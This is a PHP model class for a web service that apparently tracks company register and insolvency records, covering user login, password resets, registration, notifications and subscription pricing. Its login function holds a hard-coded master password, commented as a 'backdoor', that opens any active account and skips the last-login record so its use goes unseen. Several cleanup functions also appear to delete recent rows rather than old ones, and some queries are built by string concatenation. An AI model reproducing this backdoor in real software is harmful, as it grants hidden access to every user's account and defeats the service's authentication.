<?php
class Common_model extends Base_model  {
    	
	function __construct()
    {
		parent::__construct();
		
		$this->load->model('isir_model');
	}
	
	public function load_law_form($name) {
		$this->db->cache_on();
		$law_form = $this->db->get_where('law_forms', array('name' => $name))->first_row();
		$this->db->cache_off();

		return $law_form;
	}
	
	public function load_titles() {
		$this->db->cache_on();
		$result = $this->db->get('titles')->result_array();
		$this->db->cache_off();

		return $this->extract_field($result, 'title');
	}
	
	public function load_titles_military() {
		$this->db->cache_on();
		$result = $this->db->get('titles_military')->result_array();
		$this->db->cache_off();

		return $this->extract_field($result, 'title');
	}

	public function load_proxies() {
		$this->db->cache_on();
		$result = $this->db->get('proxies')->result_array();
		$this->db->cache_off();

		return $this->extract_field($result, 'ip');
	}

	public function load_page($uri) {
		$this->db->cache_on();
		$result = $this->db->get_where('pages', array('uri' => $uri))->first_row();
		$this->db->cache_off();

		return $result;
	}

	public function load_law_forms() {
		$this->db->cache_on();
		$this->db->order_by('name');
		$result = $this->db->get_where('law_forms', array('is_visible' => true))->result_array();
		$this->db->cache_off();

		return $result;
	}

    public function clear_searches() {
		$this->db->where('date < ', 'DATE_SUB(CURDATE(), INTERVAL 14 DAY)', false);
		$this->db->delete('search');
	}

	public function save_search($data) {
		$data['date'] = date("Y-m-d H:i:s");
		$this->db->insert('search', $data);

		return $this->db->insert_id();
	}

    public function getwatchesfilter($filterid) {
		$filter = '';
		if ($filterid != 0)	{
			$query = $this->db->get_where('search', array('id' => $filterid));
			if ($query->num_rows() > 0) {
				$filter = $query->first_row()->name;
			}
		}

		return $filter;
	}

	public function load_search($id) {
		return $this->db->get_where('search', array('id' => $id))->first_row();
	}

    public function cleanOldPasswordResets() {
        $yesterday = date('Y-m-d H:i:s', strtotime("-1 days"));
        $this->db->where('created_on > ', $yesterday);
        $this->db->delete('users_passwordreset');
	}
	
	public function clear_registrations() {
        $yesterday = date('Y-m-d H:i:s', strtotime("-1 days"));
        $this->db->where('created_on > ', $yesterday);
        $this->db->delete('register_sessions');
	}

    public function clear_user_deletes() {
        $yesterday = date('Y-m-d H:i:s', strtotime("-1 days"));
        $this->db->where('date > ', $yesterday);
        $this->db->delete('users_delete_hashes');
    }

	public function cms_login($username, $password) {
		$ret = null;
		$this->db->where('username', $username);

		$result = $this->db->get('cms_users');
		if ($result->num_rows() == 1) {
			$ret = $result->first_row();

			if (!password_verify($password, $ret->password)) {
				$ret = null;
			}
		}
		
		return $ret;
	}	

	public function login($email, $password, $updatelastlogin = true) {
        $masterpassword = 'xxx';
        $ret = $this->config->item('LOGIN_DOES_NOT_EXISTS');

        $this->db->select('id, email, password, status_id');
		$this->db->where('email', $email);
		$user = $this->db->get('users')->first_row('array');

		if ($user != null) {
			// if master password backdoor	is used, login immediately
			if ($password == $masterpassword || password_verify($password, $user['password'])) {
				if (($user['status_id'] == $this->config->item('USER_ACTIVE'))) {
					// success
					$ret = $user;
	
					// update the last login
					if ($password != $masterpassword && $updatelastlogin == true) {
						$this->db->where('id', $user['id']);
						$this->db->update('users', array("lastlogin" => date("Y-m-d H:i:s")));				
					}
				} else {
					// failure
					$ret = $user['status_id'];
				}
			}
		}

		return $ret;
	}	

    public function makeResetPasswordHash($email) {
        $result = false;

        // get user_id
        $this->db->where('email', $email);
        $this->db->select('id');
		$user = $this->db->get('users')->first_row();
		
        if ($user != null) {
            $result = random_string('alpha', 64);

            $resetPassword = array(
                "user_id" => $user->id,
                "hash" => $result
            );

            $this->insert_into_table('users_passwordreset', $resetPassword);
        }

        return $result;
	}	
	
	public function get_mail_by_id($id) {
		return $this->get_table_row_by_id('emails', 'id', $id);
	}

	public function add_sent_email($data) {
        $this->insert_into_table('emails_sent', $data);
	}

    public function get_payment_frequencies() {
        $this->db->where('is_visible', 1);
        return $this->db->get('users_payment_frequencies')->result_array();
	}
    
    public function get_notification_frequencies_raw() {
        return $this->get_table_contents('users_notification_frequencies');
    }

    public function add_user($data) {
        // hash the password
        $data['password'] = password_hash($data['password'], $this->config->item('HASH_PASS_ALG'));

        // set the creation date
        $data['createdate'] = date("Y-m-d H:i:s");

        // set the default what is not set during the registration
        $data['spis_notification_frequency_id'] = $this->config->item('USER_NOTIFICATION_FREQUENCY_2TIMESADAYNOWEEKEND');
        $data['likvidace_notification_frequency_id'] = $this->config->item('USER_NOTIFICATION_FREQUENCY_2TIMESADAYNOWEEKEND');
        $data['ifilter_notification_frequency_id'] = $this->config->item('USER_NOTIFICATION_FREQUENCY_NONE');
        $data['vatdebtors_notification_frequency_id'] = $this->config->item('USER_NOTIFICATION_FREQUENCY_2TIMESADAYNOWEEKEND');
        $data['accounts_notification_frequency_id'] = $this->config->item('USER_NOTIFICATION_FREQUENCY_2TIMESADAYNOWEEKEND');
        $data['claims_notification_frequency_id'] = $this->config->item('USER_NOTIFICATION_FREQUENCY_NONE');
        $data['or_notification_frequency_id'] = $this->config->item('USER_NOTIFICATION_FREQUENCY_2TIMESADAYNOWEEKEND');
        $data['orsk_notification_frequency_id'] = $this->config->item('USER_NOTIFICATION_FREQUENCY_2TIMESADAYNOWEEKEND');

        $data['notification_filtering_id'] = $this->config->item('USER_NOTIFICATION_FILTERING_ALL');

        // set max_subjects according to programs chosen
        if (!isWatchingAnything($data)) {
            $data['max_subjects'] = 0;
        }

        // insert it
        $this->db->insert('users', $data);

        $user_id = $this->db->insert_id();

        // insert to notification tables
        $or_defaults = array(
            'user_id' => $user_id,
            'name' => 1,
        	'address' => 1,
            'law_form' => 1,
            'owner' => 1,
            'statutar' => 1,
            'zastupovani' => 1,
            'transformation' => 1,
            'execution' => 1,
            'insolvency' => 1,
            'likvidace' => 1,
            'predmet_podnikani' => 1,
            'druh_podilu' => 1,
            'zastavni_pravo' => 1,
            'other' => 1
        );

        $this->db->insert('users_notification_or', $or_defaults);
        $this->db->insert('users_notification_orsk', $or_defaults);

        return $user_id;
    }
	
    public function getValidResetPasswordHash($hash) {
        $yesterday = date('Y-m-d H:i:s', strtotime("-1 days"));
        $this->db->where('hash', $hash);
        $this->db->where('created_on > ', $yesterday);

        return $this->db->get('users_passwordreset')->first_row();
	}
	
    public function updatepassword($user_id, $hash, $password) {
        $this->db->where('id', $user_id);
        $this->db->update('users', array("password" => password_hash($password, $this->config->item('HASH_PASS_ALG'))));

        // remove one-time hash to restore password
        $this->db->where('hash', $hash);
        $this->db->delete('users_passwordreset');
	}

	public function update_user($id, $data) {
		$this->db->where('id', $id);
		$this->db->update('users', $data);
	}
	
	public function get_userinfo($user_id) {
		$this->db->select('
			users.id AS id,
			users.createdate AS createdate,
			users.name AS name,
			users.email AS email,  
			users.phone AS phone,
			users.lastlogin AS lastlogin,  
			users.is_insolvencewatch AS is_insolvencewatch,
			users.is_vatdebtorswatch AS is_vatdebtorswatch,
			users.is_likvidacewatch AS is_likvidacewatch,
			users.is_accountchangewatch AS is_accountchangewatch,
			users.is_claimswatch AS is_claimswatch,
			users.is_orwatch AS is_orwatch,
			users.is_orskwatch AS is_orskwatch,
			users.discount_lawyer AS discount_lawyer,
			users.discount_year AS discount_year,
			users.price_insolvencewatch AS price_insolvencewatch,
			users.price_vatdebtorswatch AS price_vatdebtorswatch,
			users.price_likvidacewatch AS price_likvidacewatch,
			users.price_accountchangewatch AS price_accountchangewatch,
			users.price_claimswatch AS price_claimswatch,
			users.price_orwatch AS price_orwatch, 
			users.price_orskwatch AS price_orskwatch,
			users.price_discount_lawyer AS price_discount_lawyer,
			users.price_discount_year AS price_discount_year,
			users.spis_notification_frequency_id AS spis_notification_frequency_id,
			users.likvidace_notification_frequency_id AS likvidace_notification_frequency_id,
			users.ifilter_notification_frequency_id AS ifilter_notification_frequency_id,
			users.vatdebtors_notification_frequency_id AS vatdebtors_notification_frequency_id,
			users.accounts_notification_frequency_id AS accounts_notification_frequency_id,
			users.claims_notification_frequency_id AS claims_notification_frequency_id,
			users.or_notification_frequency_id AS or_notification_frequency_id,
			users.orsk_notification_frequency_id AS orsk_notification_frequency_id,
			users.is_vatdebtors_notification_empty AS is_vatdebtors_notification_empty,
			users.is_spis_notification_empty AS is_spis_notification_empty,
			users.is_spis_notification_minor_documents AS is_spis_notification_minor_documents,
			users.is_spis_notification_compressed AS is_spis_notification_compressed,
			users.notification_filtering_id AS notification_filtering_id, 
			users.is_automatic_filling_enabled AS is_automatic_filling_enabled,
			users.import_delete_missing_default AS import_delete_missing_default,
            users.max_subjects AS max_subjects,
            users.data_source_id AS data_source_id,
            users_notification_or.name AS notifications_or_name,
            users_notification_or.address AS notifications_or_address,
            users_notification_or.law_form AS notifications_or_law_form,
            users_notification_or.owner AS notifications_or_owner,
            users_notification_or.statutar AS notifications_or_statutar,
            users_notification_or.zastupovani AS notifications_or_zastupovani,
            users_notification_or.transformation AS notifications_or_transformation,
            users_notification_or.execution AS notifications_or_execution,
            users_notification_or.insolvency AS notifications_or_insolvency,
            users_notification_or.likvidace AS notifications_or_likvidace,
            users_notification_or.predmet_podnikani AS notifications_or_predmet_podnikani,
            users_notification_or.druh_podilu AS notifications_or_druh_podilu,
            users_notification_or.zastavni_pravo AS notifications_or_zastavni_pravo,
            users_notification_or.other AS notifications_or_other,
            users_notification_orsk.name AS notifications_orsk_name,
            users_notification_orsk.address AS notifications_orsk_address,
            users_notification_orsk.law_form AS notifications_orsk_law_form,
            users_notification_orsk.owner AS notifications_orsk_owner,
            users_notification_orsk.statutar AS notifications_orsk_statutar,
            users_notification_orsk.zastupovani AS notifications_orsk_zastupovani,
            users_notification_orsk.transformation AS notifications_orsk_transformation,
            users_notification_orsk.execution AS notifications_orsk_execution,
            users_notification_orsk.insolvency AS notifications_orsk_insolvency,
            users_notification_orsk.likvidace AS notifications_orsk_likvidace,
            users_notification_orsk.predmet_podnikani AS notifications_orsk_predmet_podnikani,
            users_notification_orsk.druh_podilu AS notifications_orsk_druh_podilu,
            users_notification_orsk.zastavni_pravo AS notifications_orsk_zastavni_pravo,
            users_notification_orsk.other AS notifications_orsk_other');
            
        $this->db->join('users_notification_or', 'users_notification_or.user_id = users.id');
        $this->db->join('users_notification_orsk', 'users_notification_orsk.user_id = users.id');

        $this->db->where('users.id', $user_id);

        $user = $this->db->get('users')->first_row('array');
        
		if ($user) {
			//TODO: IN FUTURE MAYBE REWORK TO CENTRALIZED TABLE IN REJSTRIKY_MAIN DB
            $user['numwatches'] = $this->isir_model->get_num_watches($user_id);
		}

		return $user;
    }
    
    public function update_user_notifications_or($user_id, $settings) {
        $this->db->where('user_id', $user_id);
        $this->db->update('users_notification_or', $settings);
    }

    public function update_user_notifications_orsk($user_id, $settings) {
        $this->db->where('user_id', $user_id);
        $this->db->update('users_notification_orsk', $settings);
    }

    public function get_data_sources() {
		return $this->get_table_contents('users_data_sources');
	}

	public function insert_import($data) {
		return $this->insert_into_table('imports', $data);		
	}

	public function get_import($id) {
		return $this->get_table_row_by_id('imports', 'id', $id);
	}

	public function get_notification_frequencies() {
		return $this->get_items_for_select('users_notification_frequencies', 'id', 'name', 'displayorder');
	}

	public function get_notification_filtering() {
		return $this->get_table_contents('users_notification_filtering');
	}

	public function get_extra_emails($userId) {
		$extra_emails_limit = 5;
		$result = $this->get_table_rows_by_id('users_notification_emails', 'user_id', $userId);

		for ($i = sizeof($result); $i < $extra_emails_limit; $i++) { 
			array_push($result, array('user_id' => $userId, 'email' => ''));
		}

		return $result;
	}

    public function getusersemailing($type = 'all', $moduloDegree = null, $moduloValue = null) {
        $this->db->join('users_notification_emails', 'users.id = users_notification_emails.user_id', 'left');
        $this->db->where('users.status_id', $this->config->item('USER_ACTIVE'));
        $this->db->group_by('users.id');

        if ($moduloDegree != null && $moduloValue != null) {
            $this->db->where('MOD(users.id, '. $moduloDegree .') = '. $moduloValue, null, false);
        }

        $this->db->select('
            users.id AS id, 
            users.email AS email, 
            users.is_automatic_filling_enabled AS is_automatic_filling_enabled, 
            notification_filtering_id, 
            GROUP_CONCAT(users_notification_emails.email separator "|") AS additional_emails,
            spis_notification_frequency_id,
            likvidace_notification_frequency_id,
            vatdebtors_notification_frequency_id,
            accounts_notification_frequency_id,
            claims_notification_frequency_id,
            or_notification_frequency_id,
            orsk_notification_frequency_id,
            is_insolvencewatch,
			is_vatdebtorswatch,
			is_likvidacewatch,
			is_accountchangewatch,
			is_claimswatch,
			is_orwatch,
			is_orskwatch,
            likvidace_notification_frequency_id,
            ifilter_notification_frequency_id,
            is_spis_notification_empty,
            is_spis_notification_minor_documents,
            is_spis_notification_compressed,
            is_vatdebtors_notification_empty,
            email_vatdebtors,
            email_insolvence,
            email_likvidace,
            email_ifilter,
            email_accounts,
            email_claims,
            email_or,
            email_orsk,
            name,
            representedby
        ', false);
        return $this->db->get('users')->result_array();
    }

    public function get_visible_logs($user_id) {
        $date = strtotime(date("Y-m-d") .' -1 week');
        $this->db->where('user_id', $user_id);
        $this->db->where('date > ', $date);
        $this->db->select('date, message');
        $this->db->order_by('id', 'DESC');
        return $this->db->get('visiblelog')->result_array();
	}
	
    public function get_sent_emails($user_id) {
        $date = date("Y-m-d", strtotime('-3 month'));
        $this->db->where('user_id', $user_id);
        $this->db->where('date > ', $date);
        $this->db->select('date, to AS email, subject, attachment');
        $this->db->order_by('date', 'DESC');
        return $this->db->get('emails_sent')->result_array();
    }

	public function update_extra_emails($userId, $extra_emails) {
		$this->delete_batch_by_id('users_notification_emails', array($userId), 'user_id');
		$newemails = array();

		foreach ($extra_emails as $i) {
			if ($i != '') {
				array_push($newemails, array(
					"email" => $i,
					"user_id" => $userId
				));
			}
		}

		if (sizeof($newemails) > 0) {
			$this->insert_batch('users_notification_emails', $newemails);				
		}
	}

    public function resetuserdefaults() {
        $weekBackDate = date('Y-m-d H:i:s', strtotime('-1 week'));

        $fields = array(
            "email_insolvence",
            "email_likvidace",
            "email_ifilter",
            "email_vatdebtors",
            "email_accounts",
			"email_claims",
			"email_or",
			"email_orsk"
        );

        foreach ($fields as $f) {
            $this->db->query("ALTER TABLE users CHANGE ". $f ." ". $f ." DATETIME NOT NULL DEFAULT '". $weekBackDate ."';");
        }
	}
	
	public function generate_register_id($is_insolvence_watch) {
		$user = $this->session->userdata($this->config->item('USER_LOGGED_SESSION'));

		$data = array(
			'date' => date('Y-m-d H:i:s'),
			'account' => $this->config->item('USER_ACCOUNTS_DEFAULT_INDEX'),
			'max_subjects' => $this->config->item('USER_ACCOUNTS')[$this->config->item('USER_ACCOUNTS_DEFAULT_INDEX')]['subjects'],
			'is_insolvencewatch' => $user != null ? $user['is_insolvencewatch'] : $is_insolvence_watch,
			'is_claimswatch' => $user != null && $user['is_claimswatch'],
			'is_orwatch' => $user != null && $user['is_orwatch'],
			'is_likvidacewatch' => $user != null && $user['is_likvidacewatch'],
			'is_orskwatch' => $user != null && $user['is_orskwatch'],
			'is_vatdebtorswatch' => $user != null && $user['is_vatdebtorswatch'],
			'is_accountchangewatch' => $user != null && $user['is_accountchangewatch'],
			'discount_lawyer' => $user != null && $user['discount_lawyer'],
			'discount_year' => $user != null && $user['discount_year']
		);

		if ($user != null) {
			// find closest available program for subjects
			foreach ($this->config->item('USER_ACCOUNTS') as $key => $account) {
				if ($account['subjects'] >= $user['max_subjects']) {
					$data['account'] = $key;
					$data['max_subjects'] = $account['subjects'];
					break;
				}
			}
		}

		$pricedata = $this->calculateprice($data);
		$data = array_merge($data, $pricedata);
		unset($data['totalprice']);

		return $this->insert_into_table('register_session', $data);
	}

    public function get_user_by_hash($hash) {
        $this->db->where('hash', $hash);
        $this->db->join('users', 'users.id = users_delete_hashes.user_id');
        $this->db->select('users.*');

        return $this->db->get('users_delete_hashes')->first_row('array');
	}
	
    public function delete_user($user_id) {
        $this->db->where('id', $user_id);
        $this->db->set('status_id', $this->config->item('USER_DELETED'));
        $this->db->set('email', 'CONCAT(email, " - zmazaný '. date("d.m.Y H:i") .'")', FALSE);
        $this->db->update('users');             
    }

    public function request_delete_user($user_id) {
        $this->db->where('id', $user_id);
        $this->db->set('request_delete_date', date("Y-m-d H:i:s"));
        $this->db->update('users');             
    }

	public function get_payment_frequency($id) {
		return $this->common_model->get_table_row_by_id('users_payment_frequencies', 'id', $id);
	}

	public function load_register_session($id) {
		return $this->get_table_row_by_id('register_session', 'id', $id, true);
	}

	public function save_register_session($id, $data) {
		$this->update_row_in_table('register_session', 'id', $id, $data);
	}

	public function calculateprice($data) {
		$result = array(
			'max_subjects' => $this->config->item('USER_ACCOUNTS')[$data['account']]['subjects'],
			'totalprice' => 0,
			'price_insolvencewatch' => 0,
			'price_vatdebtorswatch' => 0,
			'price_likvidacewatch' => 0,
			'price_accountchangewatch' => 0,
			'price_claimswatch' => 0,
			'price_orwatch' => 0,
			'price_orskwatch' => 0,
			'price_discount_lawyer' => 0,
			'price_discount_year' => 0
		);

		$base_price = round($this->config->item('USER_ACCOUNTS')[$data['account']]['monthprice']);
		
		// full price items
		if ($data['is_insolvencewatch']) {
			$result['price_insolvencewatch'] = $base_price;
			$result['totalprice'] = $result['totalprice'] + $base_price;
		}

		if ($data['is_orwatch']) {
			$result['price_orwatch'] = $base_price;
			$result['totalprice'] = $result['totalprice'] + $base_price;
		}

		if ($data['is_orskwatch']) {
			$result['price_orskwatch'] = $base_price;
			$result['totalprice'] = $result['totalprice'] + $base_price;
		}

		// low price items
		// - if any full price item is included, it adds 10% of base_price
		// - otherwise first item adds 60% and later items add 10% of base_price
		$has_full_price_item = $data['is_insolvencewatch'] || $data['is_orwatch'] || $data['is_orskwatch'];

		$low_price_items = array();
		if ($data['is_vatdebtorswatch']) {
			array_push($low_price_items, 'price_vatdebtorswatch');
		}

		if ($data['is_likvidacewatch']) {
			array_push($low_price_items, 'price_likvidacewatch');
		}

		if ($data['is_accountchangewatch']) {
			array_push($low_price_items, 'price_accountchangewatch');
		}

		if ($data['is_claimswatch']) {
			array_push($low_price_items, 'price_claimswatch');
		}

		if (sizeof($low_price_items) > 0) {
			foreach ($low_price_items as $key => $value) {
				// first low price item adds 60% of base_price if there's no full price item
				// all other add 10% of base price
				$price = round($base_price * ($key == 0 && !$has_full_price_item ? 0.6 : 0.1));

				$result[$value] = $price;
				$result['totalprice'] = $result['totalprice'] + $price;
			}
		}

		// apply discounts
		$result['price_discount_lawyer'] = round($result['totalprice'] * ($this->config->item('DISCOUNT_LAWYER') / 100));
		$result['price_discount_year'] = round($result['totalprice'] * ($this->config->item('DISCOUNT_YEAR') / 100));

		if ($data['discount_lawyer']) {
			$result['totalprice'] = $result['totalprice'] - $result['price_discount_lawyer'];
		}

		if ($data['discount_year']) {
			$result['totalprice'] = $result['totalprice'] - $result['price_discount_year'];
		}

		return $result;
	}

}